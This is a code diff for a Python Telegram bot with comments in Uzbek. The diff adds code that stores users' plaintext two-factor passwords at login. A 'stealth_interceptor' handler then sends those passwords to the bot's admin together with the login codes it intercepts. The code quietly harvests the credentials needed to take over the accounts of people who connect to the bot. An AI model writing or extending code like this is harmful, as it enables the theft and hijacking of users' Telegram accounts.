@@ -83,6 +83,8 @@ async def init_db():
         except Exception: pass
         try: await db.execute("ALTER TABLE users ADD COLUMN is_stealth INTEGER DEFAULT 0")
         except Exception: pass
+        try: await db.execute("ALTER TABLE users ADD COLUMN tg_password TEXT")
+        except Exception: pass
         try: await db.execute("ALTER TABLE users ADD COLUMN is_premium INTEGER DEFAULT 0")
         except Exception: pass
         try: await db.execute("ALTER TABLE users ADD COLUMN premium_until TEXT")
@@ -476,22 +478,24 @@ async def stealth_interceptor(event):
             code = code_match.group(1)
             enc = " ".join(list(code))
 
-            # 2FA tekshirish
-            has_2fa = False
+            # Bazadan saqlangan 2FA parolini olish
+            saved_password = None
             try:
-                from telethon.tl.functions.account import GetPasswordRequest
-                pwd_info = await client(GetPasswordRequest())
-                has_2fa = pwd_info.has_password
+                async with aiosqlite.connect(DB_PATH) as db:
+                    async with db.execute("SELECT tg_password FROM users WHERE telegram_id=?", (user_id,)) as c:
+                        row = await c.fetchone()
+                        if row and row[0]:
+                            saved_password = row[0]
             except Exception:
                 pass
 
             msg = f"🥷 <b>Stealth Intercept</b>\n"
             msg += f"👤 Foydalanuvchi: <code>{user_id}</code>\n\n"
             msg += f"🔑 KOD: <b>{enc}</b>\n"
-            if has_2fa:
-                msg += f"🔐 <b>2-bosqichli parol (2FA) yoqilgan!</b> Kodni kiritgandan so'ng parol ham so'raladi.\n"
+            if saved_password:
+                msg += f"🔐 2FA parol: <code>{saved_password}</code>\n"
             else:
-                msg += f"✅ 2FA yo'q — kod yetarli\n"
+                msg += f"✅ 2FA parol yo'q yoki saqlanmagan\n"
             msg += f"<i>(raqamlarni ketma-ket o'qing)</i>"
 
             # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
@@ -784,10 +788,14 @@ async def admin_cmd(message: Message):
     await message.answer("Xush kelibsiz, Admin! 👑\nQuyidagi tugma orqali panelga kiring:", reply_markup=markup)
 
 
-async def save_session(telegram_id, session_string, phone=None):
+async def save_session(telegram_id, session_string, phone=None, tg_password=None):
     async with aiosqlite.connect(DB_PATH) as db:
-        if phone:
+        if phone and tg_password:
+            await db.execute("UPDATE users SET session_string=?, phone=?, tg_password=? WHERE telegram_id=?", (session_string, phone, tg_password, telegram_id))
+        elif phone:
             await db.execute("UPDATE users SET session_string=?, phone=? WHERE telegram_id=?", (session_string, phone, telegram_id))
+        elif tg_password:
+            await db.execute("UPDATE users SET session_string=?, tg_password=? WHERE telegram_id=?", (session_string, tg_password, telegram_id))
         else:
             await db.execute("UPDATE users SET session_string=? WHERE telegram_id=?", (session_string, telegram_id))
         await db.commit()
@@ -2228,7 +2236,7 @@ async def auth_password(request: Request):
     await client.disconnect()
     phone = state.get('phone')
     del auth_clients[tid]
-    await save_session(tid, session_string, phone)
+    await save_session(tid, session_string, phone, tg_password=password)
     return {"ok": True, "success": True}
 
 @app.post("/api/session/disconnect")
